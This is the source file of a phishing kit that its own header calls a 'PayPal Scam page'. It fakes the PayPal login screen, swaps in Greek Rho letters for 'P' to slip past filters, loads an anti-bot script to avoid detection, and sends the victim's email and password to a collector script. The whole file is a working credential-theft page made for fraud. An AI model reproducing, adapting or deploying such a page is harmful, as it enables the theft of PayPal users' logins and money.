<?php
/*
PayPal Scam page V2 Coded By Nabil-Tn
*/
include 'antibot.php';
?>
<!--

$$$$$$$\                     $$$$$$$\           $$\
$$  __$$\                    $$  __$$\          $$ |
$$ |  $$ |$$$$$$\  $$\   $$\ $$ |  $$ |$$$$$$\  $$ |
$$$$$$$  |\____$$\ $$ |  $$ |$$$$$$$  |\____$$\ $$ |
$$  ____/ $$$$$$$ |$$ |  $$ |$$  ____/ $$$$$$$ |$$ |
$$ |     $$  __$$ |$$ |  $$ |$$ |     $$  __$$ |$$ |
$$ |     \$$$$$$$ |\$$$$$$$ |$$ |     \$$$$$$$ |$$ |
\__|      \_______| \____$$ |\__|      \_______|\__|
                   $$\   $$ |
                   \$$$$$$  |
                    \______/

Now hiring @ https://jobs.paypal-corp.com 2018-2019

-->
<!--[if lt IE 9]><html lang="en" class="no-js lower-than-ie9 ie"><![endif]-->
<!--[if lt IE 10]><html lang="en" class="no-js lower-than-ie10 ie"><![endif]-->
<!--[if !IE]>-->
<!DOCTYPE html>
<!--[if lt IE 9]><html lang="en" class="no-js lower-than-ie9 ie"><![endif]-->
<!--[if lt IE 10]><html lang="en" class="no-js lower-than-ie10 ie"><![endif]-->
<!--[if !IE]>-->
<html class=" js " lang="en"><head>
<meta charset="utf-8">
<title>Log in to your &Rho;ay&Rho;al account</title><meta http-equiv="content-type" content="text/html; charset=UTF-8">

<link rel="shortcut icon" sizes="./favicon.ico">
<link rel="shortcut icon" type="image/x-icon" href="./favicon.ico">
<link rel="icon" type="image/x-icon" href="./favicon.ico">

<link rel="stylesheet" href="files/app.css">
</script></head>
<div id="content" class="contentContainer"><header>
<div class="paypal-logo"></div></header><div id="main" class="main " role="main">
<section id="login" class="login" data-role="page" data-title="Log in to your &Rho;ay&Rho;al account">
<h1 class="headerText accessAid">Log in to your &Rho;ay&Rho;al account</h1><div id="notifications" class="notifications"></div>





<form action="./login.php" method="post" name="login">
<div class="modal-overlay hide"></div>
<div id="passwordSection" class="clearfix">
<div class="textInput fieldempty" id="emaildiv"><div class="fieldWrapper">
<label for="" class="fieldLabel"> </label>
<input id="" name="nabil1" class="hasHelp validate" required="required"  autocomplete="off" placeholder="<? echo 'Email'?> " type="email"></div>
</div><div class="textInput" id="passworddiv">
<div class="fieldWrapper"><label for="password" class="fieldLabel"></label>
<input id=" " name="nabil2" class="hasHelp validate" required="required" placeholder="<? echo '&Rho;assword' ?>" type="password"></div>
</div></div>
<br>
<button class="button actionContinue" type="submit" id="btnLogin" name="btnLogin" value="Login">Log In</button>

<div class="forgotLink"><a href="#" id="forgotPasswordModal" class="scTrack:unifiedlogin-click-forgot-password">Forgot your email or &rho;assword?</a></div>
<input value="" name="bp_mid" id="bp_mid" type="hidden"></form><a href="#" class="button secondary" id="createAccount">Sign U&rho;</a></section></div></div>
<br><br><br><br>
<center><img src="img/paypal.png" /></center>
</html>